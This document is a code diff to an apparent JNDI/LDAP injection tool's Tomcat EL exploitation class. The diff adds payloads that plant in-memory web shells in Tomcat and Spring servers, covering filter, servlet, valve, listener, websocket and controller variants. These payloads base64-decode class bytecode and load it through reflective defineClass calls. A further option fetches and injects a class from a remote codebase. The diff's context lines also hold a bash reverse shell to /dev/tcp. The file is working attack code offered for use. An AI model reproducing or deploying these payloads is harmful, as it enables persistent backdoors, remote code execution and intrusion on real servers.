@@ -5,8 +5,11 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
+import javassist.ClassPool;
+import javassist.CtClass;
 import net.roboterh.injector.enums.PayloadEnum;
 import net.roboterh.injector.servers.HTTPServer;
+import net.roboterh.injector.templates.*;
 import net.roboterh.injector.utils.GadgetUtils;
 import net.roboterh.injector.utils.PayloadUtils;
 import org.apache.log4j.LogManager;
@@ -14,7 +17,9 @@ import org.apache.log4j.Logger;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
+import java.io.InputStream;
 import java.util.Arrays;
+
 
 /*
     Tomcat EL Way:
@@ -71,10 +76,16 @@ public class TomcatEL implements LDAPService {
         int secondIndex = baseDN.indexOf("/", firstIndex + 1);
 
         // obtain the value of Payload
-        payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));
+        if (secondIndex != -1) {
+            payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1, secondIndex));
+        } else {
+            // only one '/'
+            payload = PayloadEnum.valueOf(baseDN.substring(firstIndex + 1));
+        }
 
         // add params
         switch (payload.name()) {
+            case "JavaFile":
             case "DnsLog":
             case "File":
                 String link = baseDN.substring(baseDN.lastIndexOf("/") + 1);
@@ -107,6 +118,45 @@ public class TomcatEL implements LDAPService {
                     break;
                 case "File":
                     replacement = HttpUtil.get(HTTPServer.codeBase + params[0]);
+                    break;
+                case "TomcatEcho":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatEcho.class);
+                    break;
+                case "TomcatExecutor":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatExecutor.class);
+                    break;
+                case "TomcatFilter":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatFilter.class);
+                    break;
+                case "TomcatListener":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatListener.class);
+                    break;
+                case "TomcatServlet":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatServlet.class);
+                    break;
+                case "TomcatUpgrade":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatUpgrade.class);
+                    break;
+                case "TomcatValve":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatValve.class);
+                    break;
+                case "TomcatWebsocket":
+                    replacement = tomcatELTemplate.getMemoryShell(TomcatWebsocket.class);
+                    break;
+                case "SpringController":
+                    replacement = tomcatELTemplate.getMemoryShell(SpringController.class);
+                    break;
+                case "SpringEcho":
+                    replacement = tomcatELTemplate.getMemoryShell(SpringEcho.class);
+                    break;
+                case "SpringInterceptor":
+                    replacement = tomcatELTemplate.getMemoryShell(SpringInterceptor.class);
+                    break;
+                case "JavaFile":
+                    InputStream inputStream = HttpUtil.createGet(HTTPServer.codeBase + params[0]).execute().bodyStream();
+                    ClassPool pool = ClassPool.getDefault();
+                    CtClass ctClass = pool.makeClass(inputStream);
+                    replacement = tomcatELTemplate.getRemoteMemoryShell(PayloadUtils.base64Encode(ctClass.toBytecode()), ctClass.getName());
                     break;
             }
         } catch (Exception e) {
@@ -154,6 +204,52 @@ public class TomcatEL implements LDAPService {
                     "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                     "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                     "            }";
+
+            return code;
+        }
+
+        public String getRemoteMemoryShell(String classCode, String ClassName) {
+            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
+                    "try{\n" +
+//                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
+//                    "   clazz.newInstance();\n" +
+//                      "   Class<?> aClass1 = Class.forName(\"" + clazz.getName() + "\");\n" +
+                    "   classLoader.loadClass('" + ClassName + "').newInstance();\n" +
+                    "}catch(err){\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   method.setAccessible(true);\n" +
+                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                    "   clazz.newInstance();\n" +
+                    "};";
+
+            return code;
+        }
+
+        // inject using classLoader
+        public String getMemoryShell(Class clazz, String... args) {
+            String classCode = null;
+            try{
+//                获取base64后的类
+                classCode = PayloadUtils.getClassCode(clazz);
+
+            }catch(Exception e){
+                e.printStackTrace();
+            }
+
+            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
+                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
+                    "try{\n" +
+//                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
+//                    "   clazz.newInstance();\n" +
+//                      "   Class<?> aClass1 = Class.forName(\"" + clazz.getName() + "\");\n" +
+                    "   classLoader.loadClass('" + clazz.getName() + "').newInstance();\n" +
+                    "}catch(err){\n" +
+                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
+                    "   method.setAccessible(true);\n" +
+                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
+                    "   clazz.newInstance();\n" +
+                    "};";
 
             return code;
         }
